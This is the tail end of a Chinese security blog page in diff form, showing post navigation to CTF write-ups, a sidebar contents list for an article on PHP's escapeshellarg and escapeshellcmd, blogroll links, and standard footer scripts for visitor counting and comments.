+              <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag"><i class="fa fa-tag"></i> 文件上传</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018-HXB-Preliminary/" rel="prev" title="2018 湖湘杯 线上初赛 部分题解">
+      <i class="fa fa-chevron-left"></i> 2018 湖湘杯 线上初赛 部分题解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018-BYB-Preliminary/" rel="next" title="2018 福建省高校网络空间安全大赛 百越杯 线上初赛 部分题解">
+      2018 福建省高校网络空间安全大赛 百越杯 线上初赛 部分题解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#在线工具"><span class="nav-number">1.</span> <span class="nav-text">在线工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#两个重要函数"><span class="nav-number">1.1.</span> <span class="nav-text">两个重要函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#escapeshellarg"><span class="nav-number">1.1.1.</span> <span class="nav-text">escapeshellarg</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#escapeshellcmd"><span class="nav-number">1.1.2.</span> <span class="nav-text">escapeshellcmd</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一个简单结论"><span class="nav-number">1.2.</span> <span class="nav-text">一个简单结论</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一个简单举例"><span class="nav-number">1.3.</span> <span class="nav-text">一个简单举例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#赛题详解"><span class="nav-number">1.4.</span> <span class="nav-text">赛题详解</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#黑产了解一下？"><span class="nav-number">2.</span> <span class="nav-text">黑产了解一下？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#不知名的小站"><span class="nav-number">3.</span> <span class="nav-text">不知名的小站</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Refer"><span class="nav-number">4.</span> <span class="nav-text">Refer</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="南溟丷"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">南溟丷</p>
+  <div class="site-description" itemprop="description">我想在那里最蓝的大海扬帆</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">66</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/southseast" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;southseast" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:i@southsea.st" title="E-Mail → mailto:i@southsea.st"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.codemonster.cn/" title="https:&#x2F;&#x2F;www.codemonster.cn&#x2F;" rel="noopener" target="_blank">Xishir</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.lmxspace.com/" title="http:&#x2F;&#x2F;www.lmxspace.com&#x2F;" rel="noopener" target="_blank">L1nk3r</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://she1don.cn/" title="http:&#x2F;&#x2F;she1don.cn&#x2F;" rel="noopener" target="_blank">Sheldon</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yuf1sher.xyz/" title="http:&#x2F;&#x2F;www.yuf1sher.xyz&#x2F;" rel="noopener" target="_blank">saltyfishyu</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.backcover7.cc/" title="https:&#x2F;&#x2F;blog.backcover7.cc&#x2F;" rel="noopener" target="_blank">backcover7</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cyto.top/" title="https:&#x2F;&#x2F;cyto.top&#x2F;" rel="noopener" target="_blank">Cytosine</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.csdn.net/PeterZ1997/" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;PeterZ1997&#x2F;" rel="noopener" target="_blank">PeterZ</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://ju5tw4nty0u.top/" title="http:&#x2F;&#x2F;ju5tw4nty0u.top&#x2F;" rel="noopener" target="_blank">ju5tw4nty0u</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.thecosmos.cn/" title="http:&#x2F;&#x2F;blog.thecosmos.cn&#x2F;" rel="noopener" target="_blank">Cosmos</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://nepire.github.io/" title="https:&#x2F;&#x2F;nepire.github.io&#x2F;" rel="noopener" target="_blank">Nepire</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.anonym1ty.cn/" title="http:&#x2F;&#x2F;www.anonym1ty.cn&#x2F;" rel="noopener" target="_blank">豆浆油条</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://a3ura.github.io/" title="https:&#x2F;&#x2F;a3ura.github.io&#x2F;" rel="noopener" target="_blank">A3ura</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://lihuaiqiu.github.io/" title="https:&#x2F;&#x2F;lihuaiqiu.github.io&#x2F;" rel="noopener" target="_blank">离怀秋</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.zhaoj.in/" title="https:&#x2F;&#x2F;www.zhaoj.in&#x2F;" rel="noopener" target="_blank">glzjin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.sketchplane.top/" title="http:&#x2F;&#x2F;www.sketchplane.top&#x2F;" rel="noopener" target="_blank">sketch_pl4ne</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yk2.work/" title="http:&#x2F;&#x2F;www.yk2.work&#x2F;" rel="noopener" target="_blank">yk2</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.star123.top/" title="http:&#x2F;&#x2F;www.star123.top&#x2F;" rel="noopener" target="_blank">star</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">南溟丷</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-user"></i>
+        </span>
+      -->
+      有
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <!--
+      <span class="post-meta-divider">|</span>
+    -->
+    <span class="post-meta-divider">只猫来偷了</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-eye"></i>
+        </span>
+      -->
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+      条鱼
+    </span>
+</div>
+
+
+
+
+
+
+<script>
+  (function() {
+    function leancloudSelector(url) {
+      url = encodeURI(url);
+      return document.getElementById(url).querySelector('.leancloud-visitors-count');
+    }
+
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = decodeURI(visitors.id);
+      var title = visitors.dataset.flagTitle;
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            leancloudSelector(url).innerText = counter.time + 1;
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .catch(error => {
+                console.error('Failed to save visitor count', error);
+              });
+          } else {
+              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return decodeURI(element.id);
+      });
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          for (let url of entries) {
+            let target = results.find(item => item.url === url);
+            leancloudSelector(url).innerText = target ? target.time : 0;
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    let { app_id, app_key, server_url } = {"enable":true,"app_id":"rebG01SwSXMoY7eaX8QScfRV-MdYXbMMI","app_key":"u3yrkhkuseHahqDsz60AhPYz","server_url":null,"security":true};
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${api_server}/1.1${url}`, {
+          method,
+          headers: {
+            'X-LC-Id'     : app_id,
+            'X-LC-Key'    : app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        if (CONFIG.hostname !== location.hostname) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    }
+
+    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(response => response.json())
+        .then(({ api_server }) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.1.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'I06GJpS9glw9Vb019QqawEVk-gzGzoHsz',
+      appKey     : 'cicAwmh5fPIP0nA0oiNQRhQk',
+      placeholder: "喵！被我抓到你偷鱼了！",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
